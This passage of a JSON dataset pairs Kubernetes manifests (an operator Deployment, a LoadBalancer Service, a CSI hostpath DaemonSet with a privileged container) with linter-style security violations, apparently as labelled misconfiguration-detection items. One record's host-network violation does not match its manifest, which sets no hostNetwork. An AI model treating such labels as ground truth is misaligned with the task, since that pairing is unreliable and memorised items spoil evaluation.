    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: atlasmap-operator\n  labels:\n    control-plane: controller-manager\nspec:\n  selector:\n    matchLabels:\n      control-plane: controller-manager\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        control-plane: controller-manager\n    spec:\n      securityContext:\n        runAsNonRoot: true\n      containers:\n      - command:\n        - /manager\n        args:\n        - --leader-elect\n        image: controller:latest\n        name: manager\n        securityContext:\n          allowPrivilegeEscalation: false\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        resources:\n          limits:\n            cpu: 200m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: atlasmap-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"manager\" does not have a read-only root file system"
  },
  {
    "id": "2938",
    "manifest_path": "data/manifests/the_stack_sample/sample_0842.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: atlasmap-operator\n  labels:\n    control-plane: controller-manager\nspec:\n  selector:\n    matchLabels:\n      control-plane: controller-manager\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        control-plane: controller-manager\n    spec:\n      securityContext:\n        runAsNonRoot: true\n      containers:\n      - command:\n        - /manager\n        args:\n        - --leader-elect\n        image: controller:latest\n        name: manager\n        securityContext:\n          allowPrivilegeEscalation: false\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        resources:\n          limits:\n            cpu: 200m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: atlasmap-operator\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"atlasmap-operator\" not found"
  },
  {
    "id": "2939",
    "manifest_path": "data/manifests/the_stack_sample/sample_0842.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: atlasmap-operator\n  labels:\n    control-plane: controller-manager\nspec:\n  selector:\n    matchLabels:\n      control-plane: controller-manager\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        control-plane: controller-manager\n    spec:\n      securityContext:\n        runAsNonRoot: true\n      containers:\n      - command:\n        - /manager\n        args:\n        - --leader-elect\n        image: controller:latest\n        name: manager\n        securityContext:\n          allowPrivilegeEscalation: false\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        resources:\n          limits:\n            cpu: 200m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: atlasmap-operator\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"manager\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "2940",
    "manifest_path": "data/manifests/the_stack_sample/sample_0843.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: report-master\nspec:\n  ports:\n  - port: 443\n    protocol: TCP\n    name: endpoint-https\n  selector:\n    name: report-master\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:report-master])"
  },
  {
    "id": "2941",
    "manifest_path": "data/manifests/the_stack_sample/sample_0846.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: opendesign-datapertus-test-deployment\n  namespace: opendesign-datapertus-test\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: opendesign-datapertus-test\n  template:\n    metadata:\n      labels:\n        app: opendesign-datapertus-test\n    spec:\n      containers:\n      - name: opendesign-datapertus-test\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/dataset-test:v0.0.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2942",
    "manifest_path": "data/manifests/the_stack_sample/sample_0846.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: opendesign-datapertus-test-deployment\n  namespace: opendesign-datapertus-test\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: opendesign-datapertus-test\n  template:\n    metadata:\n      labels:\n        app: opendesign-datapertus-test\n    spec:\n      containers:\n      - name: opendesign-datapertus-test\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/dataset-test:v0.0.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"opendesign-datapertus-test\" does not have a read-only root file system"
  },
  {
    "id": "2943",
    "manifest_path": "data/manifests/the_stack_sample/sample_0846.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: opendesign-datapertus-test-deployment\n  namespace: opendesign-datapertus-test\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: opendesign-datapertus-test\n  template:\n    metadata:\n      labels:\n        app: opendesign-datapertus-test\n    spec:\n      containers:\n      - name: opendesign-datapertus-test\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/dataset-test:v0.0.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"opendesign-datapertus-test\" is not set to runAsNonRoot"
  },
  {
    "id": "2944",
    "manifest_path": "data/manifests/the_stack_sample/sample_0846.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: opendesign-datapertus-test-deployment\n  namespace: opendesign-datapertus-test\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: opendesign-datapertus-test\n  template:\n    metadata:\n      labels:\n        app: opendesign-datapertus-test\n    spec:\n      containers:\n      - name: opendesign-datapertus-test\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/dataset-test:v0.0.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"opendesign-datapertus-test\" has cpu request 0"
  },
  {
    "id": "2945",
    "manifest_path": "data/manifests/the_stack_sample/sample_0846.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: opendesign-datapertus-test-deployment\n  namespace: opendesign-datapertus-test\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: opendesign-datapertus-test\n  template:\n    metadata:\n      labels:\n        app: opendesign-datapertus-test\n    spec:\n      containers:\n      - name: opendesign-datapertus-test\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/dataset-test:v0.0.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"opendesign-datapertus-test\" has memory limit 0"
  },
  {
    "id": "2946",
    "manifest_path": "data/manifests/the_stack_sample/sample_0847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-hostpathplugin\nspec:\n  selector:\n    matchLabels:\n      app: csi-hostpathplugin\n  template:\n    metadata:\n      labels:\n        app: csi-hostpathplugin\n    spec:\n      serviceAccountName: csi-driver-registrar\n      containers:\n      - name: driver-registrar\n        image: quay.io/k8scsi/driver-registrar:v0.4.1\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/csi-hostpath/csi.sock\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /registration\n          name: registration-dir\n      - name: hostpath\n        image: quay.io/k8scsi/hostpathplugin:v0.4.1\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/pods\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/csi-hostpath\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/pods\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins\n          type: Directory\n        name: registration-dir\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "2947",
    "manifest_path": "data/manifests/the_stack_sample/sample_0847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-hostpathplugin\nspec:\n  selector:\n    matchLabels:\n      app: csi-hostpathplugin\n  template:\n    metadata:\n      labels:\n        app: csi-hostpathplugin\n    spec:\n      serviceAccountName: csi-driver-registrar\n      containers:\n      - name: driver-registrar\n        image: quay.io/k8scsi/driver-registrar:v0.4.1\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/csi-hostpath/csi.sock\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /registration\n          name: registration-dir\n      - name: hostpath\n        image: quay.io/k8scsi/hostpathplugin:v0.4.1\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/pods\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/csi-hostpath\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/pods\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins\n          type: Directory\n        name: registration-dir\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"driver-registrar\" does not have a read-only root file system"
  },
  {
    "id": "2948",
    "manifest_path": "data/manifests/the_stack_sample/sample_0847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-hostpathplugin\nspec:\n  selector:\n    matchLabels:\n      app: csi-hostpathplugin\n  template:\n    metadata:\n      labels:\n        app: csi-hostpathplugin\n    spec:\n      serviceAccountName: csi-driver-registrar\n      containers:\n      - name: driver-registrar\n        image: quay.io/k8scsi/driver-registrar:v0.4.1\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/csi-hostpath/csi.sock\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /registration\n          name: registration-dir\n      - name: hostpath\n        image: quay.io/k8scsi/hostpathplugin:v0.4.1\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/pods\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/csi-hostpath\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/pods\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins\n          type: Directory\n        name: registration-dir\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hostpath\" does not have a read-only root file system"
  },
  {
    "id": "2949",
    "manifest_path": "data/manifests/the_stack_sample/sample_0847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-hostpathplugin\nspec:\n  selector:\n    matchLabels:\n      app: csi-hostpathplugin\n  template:\n    metadata:\n      labels:\n        app: csi-hostpathplugin\n    spec:\n      serviceAccountName: csi-driver-registrar\n      containers:\n      - name: driver-registrar\n        image: quay.io/k8scsi/driver-registrar:v0.4.1\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/csi-hostpath/csi.sock\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /registration\n          name: registration-dir\n      - name: hostpath\n        image: quay.io/k8scsi/hostpathplugin:v0.4.1\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/pods\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/csi-hostpath\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/pods\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins\n          type: Directory\n        name: registration-dir\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"csi-driver-registrar\" not found"
  },
  {
    "id": "2950",
    "manifest_path": "data/manifests/the_stack_sample/sample_0847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-hostpathplugin\nspec:\n  selector:\n    matchLabels:\n      app: csi-hostpathplugin\n  template:\n    metadata:\n      labels:\n        app: csi-hostpathplugin\n    spec:\n      serviceAccountName: csi-driver-registrar\n      containers:\n      - name: driver-registrar\n        image: quay.io/k8scsi/driver-registrar:v0.4.1\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/csi-hostpath/csi.sock\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /registration\n          name: registration-dir\n      - name: hostpath\n        image: quay.io/k8scsi/hostpathplugin:v0.4.1\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/pods\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/csi-hostpath\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/pods\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins\n          type: Directory\n        name: registration-dir\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"hostpath\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "2951",
    "manifest_path": "data/manifests/the_stack_sample/sample_0847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-hostpathplugin\nspec:\n  selector:\n    matchLabels:\n      app: csi-hostpathplugin\n  template:\n    metadata:\n      labels:\n        app: csi-hostpathplugin\n    spec:\n      serviceAccountName: csi-driver-registrar\n      containers:\n      - name: driver-registrar\n        image: quay.io/k8scsi/driver-registrar:v0.4.1\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/csi-hostpath/csi.sock\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /registration\n          name: registration-dir\n      - name: hostpath\n        image: quay.io/k8scsi/hostpathplugin:v0.4.1\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/pods\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/csi-hostpath\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/pods\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins\n          type: Directory\n        name: registration-dir\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"hostpath\" is privileged"
  },
  {
    "id": "2952",
    "manifest_path": "data/manifests/the_stack_sample/sample_0847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-hostpathplugin\nspec:\n  selector:\n    matchLabels:\n      app: csi-hostpathplugin\n  template:\n    metadata:\n      labels:\n        app: csi-hostpathplugin\n    spec:\n      serviceAccountName: csi-driver-registrar\n      containers:\n      - name: driver-registrar\n        image: quay.io/k8scsi/driver-registrar:v0.4.1\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/csi-hostpath/csi.sock\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /registration\n          name: registration-dir\n      - name: hostpath\n        image: quay.io/k8scsi/hostpathplugin:v0.4.1\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/pods\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/csi-hostpath\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/pods\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins\n          type: Directory\n        name: registration-dir\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"driver-registrar\" is not set to runAsNonRoot"
  },
  {
    "id": "2953",
    "manifest_path": "data/manifests/the_stack_sample/sample_0847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-hostpathplugin\nspec:\n  selector:\n    matchLabels:\n      app: csi-hostpathplugin\n  template:\n    metadata:\n      labels:\n        app: csi-hostpathplugin\n    spec:\n      serviceAccountName: csi-driver-registrar\n      containers:\n      - name: driver-registrar\n        image: quay.io/k8scsi/driver-registrar:v0.4.1\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/csi-hostpath/csi.sock\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /registration\n          name: registration-dir\n      - name: hostpath\n        image: quay.io/k8scsi/hostpathplugin:v0.4.1\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/pods\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/csi-hostpath\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/pods\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins\n          type: Directory\n        name: registration-dir\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hostpath\" is not set to runAsNonRoot"
  },
  {
    "id": "2954",
    "manifest_path": "data/manifests/the_stack_sample/sample_0847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-hostpathplugin\nspec:\n  selector:\n    matchLabels:\n      app: csi-hostpathplugin\n  template:\n    metadata:\n      labels:\n        app: csi-hostpathplugin\n    spec:\n      serviceAccountName: csi-driver-registrar\n      containers:\n      - name: driver-registrar\n        image: quay.io/k8scsi/driver-registrar:v0.4.1\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/csi-hostpath/csi.sock\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /registration\n          name: registration-dir\n      - name: hostpath\n        image: quay.io/k8scsi/hostpathplugin:v0.4.1\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/pods\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/csi-hostpath\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/pods\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins\n          type: Directory\n        name: registration-dir\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"driver-registrar\" has cpu request 0"
  },
  {
    "id": "2955",
    "manifest_path": "data/manifests/the_stack_sample/sample_0847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-hostpathplugin\nspec:\n  selector:\n    matchLabels:\n      app: csi-hostpathplugin\n  template:\n    metadata:\n      labels:\n        app: csi-hostpathplugin\n    spec:\n      serviceAccountName: csi-driver-registrar\n      containers:\n      - name: driver-registrar\n        image: quay.io/k8scsi/driver-registrar:v0.4.1\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/csi-hostpath/csi.sock\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /registration\n          name: registration-dir\n      - name: hostpath\n        image: quay.io/k8scsi/hostpathplugin:v0.4.1\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/pods\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/csi-hostpath\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/pods\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins\n          type: Directory\n        name: registration-dir\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hostpath\" has cpu request 0"
  },
  {
    "id": "2956",
    "manifest_path": "data/manifests/the_stack_sample/sample_0847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-hostpathplugin\nspec:\n  selector:\n    matchLabels:\n      app: csi-hostpathplugin\n  template:\n    metadata:\n      labels:\n        app: csi-hostpathplugin\n    spec:\n      serviceAccountName: csi-driver-registrar\n      containers:\n      - name: driver-registrar\n        image: quay.io/k8scsi/driver-registrar:v0.4.1\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/csi-hostpath/csi.sock\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /registration\n          name: registration-dir\n      - name: hostpath\n        image: quay.io/k8scsi/hostpathplugin:v0.4.1\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/pods\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/csi-hostpath\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/pods\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins\n          type: Directory\n        name: registration-dir\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"driver-registrar\" has memory limit 0"
  },
  {
    "id": "2957",
    "manifest_path": "data/manifests/the_stack_sample/sample_0847.yaml",
